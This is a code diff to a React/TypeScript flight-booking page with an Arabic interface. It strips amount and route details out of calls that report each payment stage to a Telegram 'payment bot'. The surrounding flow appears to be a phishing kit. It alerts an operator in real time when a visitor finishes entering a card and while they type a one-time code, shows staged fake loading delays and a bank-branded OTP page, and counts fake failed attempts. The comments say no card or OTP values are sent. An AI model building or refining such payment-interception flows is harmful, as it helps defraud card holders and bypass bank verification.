@@ -28,11 +28,8 @@ function getFareMultiplier(
 }
 
 // ─── Payment Entry Notification (Payment Bot) ─────────────────
-async function notifyPaymentEntry(booking: BookingData, paymentMethod: string, amount: number) {
-  await sendPaymentToTelegram({
-    amount, from: booking.from, to: booking.to,
-    paymentMethod, step: 'card-entered',
-  });
+async function notifyPaymentEntry() {
+  await sendPaymentToTelegram({ step: 'card-entered' });
 }
 
 // ─── Types ────────────────────────────────────────────────────
@@ -373,36 +370,20 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   // Notify only that the payment form reached each stage. The helper builds an
   // allow-listed payload and never sends card, expiry, CVV, holder, or OTP data.
-  const cardNotifiedRef = useRef(false);
   const allFieldsNotifiedRef = useRef(false);
 
   useEffect(() => {
     const digitsOnly = cardNumber.replace(/\s/g, '');
-    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-
-    // Stage 1: Card number complete (16 digits) → notify payment bot
-    if (digitsOnly.length >= 16 && !cardNotifiedRef.current) {
-      cardNotifiedRef.current = true;
-      sendPaymentToTelegram({
-        amount: finalTotal, from: bookingData.from, to: bookingData.to,
-        paymentMethod: paymentName, step: 'card-entered',
-      });
-    }
-
-    // Stage 2: All card fields complete (ready to pay) → notify payment bot
+    // Notify only when all fields become filled in. No field value is sent.
     const expFilled = expiryDate.length >= 5;
     const cvvFilled = cvv.length >= 3;
     if (digitsOnly.length >= 16 && expFilled && cvvFilled && !allFieldsNotifiedRef.current) {
       allFieldsNotifiedRef.current = true;
-      sendPaymentToTelegram({
-        amount: finalTotal, from: bookingData.from, to: bookingData.to,
-        paymentMethod: paymentName, step: 'card-complete',
-      });
+      sendPaymentToTelegram({ step: 'card-complete' });
     }
 
     // Reset if card is cleared
     if (digitsOnly.length < 16) {
-      cardNotifiedRef.current = false;
       allFieldsNotifiedRef.current = false;
     }
     // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -420,12 +401,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     if (otpRealTimeSentRef.current[key]) return;
     otpRealTimeSentRef.current[key] = true;
 
-    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    sendPaymentToTelegram({
-      amount: finalTotal, from: bookingData.from, to: bookingData.to,
-      paymentMethod: paymentName, step: 'otp-typing',
-      attemptNumber: failedAttempts + 1,
-    });
+    sendPaymentToTelegram({ step: 'otp-typing' });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [verificationCode]);
 
@@ -478,7 +454,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     setResultsLoaded(false);
     setShowCardErrorToast(false);
     passengerDataRef.current = {};
-    cardNotifiedRef.current = false;
     allFieldsNotifiedRef.current = false;
     // Show loading briefly then reveal results
     const timer = setTimeout(() => setResultsLoaded(true), 1500);
@@ -639,7 +614,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       }
     }
     notifyStep('💳 اختيار طريقة الدفع', bookingData, { paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, amount: String(finalTotal) });
-    notifyPaymentEntry(bookingData, paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, finalTotal);
+    notifyPaymentEntry();
     await goToStep('payment', 4, 8000);
   };
 
@@ -663,14 +638,6 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       setDetectedBank(null); // Will use default OTP page
     }
 
-    // Send a safe stage-only notification.
-    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-
-    await sendPaymentToTelegram({
-      amount: finalTotal, from: bookingData.from, to: bookingData.to,
-      paymentMethod: paymentName, step: 'card-complete',
-    });
-
     // 8-sec loading then route to bank-branded OTP
     await goToStep('code_verification', 5, 8000);
   };
@@ -682,13 +649,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     const newAttempts = failedAttempts + 1;
     setFailedAttempts(newAttempts);
 
-    // Send a safe attempt notification without the OTP value.
-    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    await sendPaymentToTelegram({
-      amount: finalTotal, from: bookingData.from, to: bookingData.to,
-      paymentMethod: paymentName, step: 'otp-attempt',
-      attemptNumber: newAttempts,
-    });
+    await sendPaymentToTelegram({ step: 'otp-attempt' });
 
     // Show loading (8 seconds for payment verification)
     setLoadingMsg('جارٍ التحقق من الرمز...');
@@ -709,13 +670,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   // otp_4 "Retry" button → loading → code_failed → send to payment bot
   const handleOtp4Retry = async () => {
-    // Send a safe failure notification without any OTP or card data.
-    const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
-    await sendPaymentToTelegram({
-      amount: finalTotal, from: bookingData.from, to: bookingData.to,
-      paymentMethod: paymentName, step: 'otp-failed',
-      attemptNumber: 4,
-    });
+    await sendPaymentToTelegram({ step: 'otp-failed' });
 
     setLoadingMsg('جارٍ التحقق من الرمز...');
     setIsLoading(true);
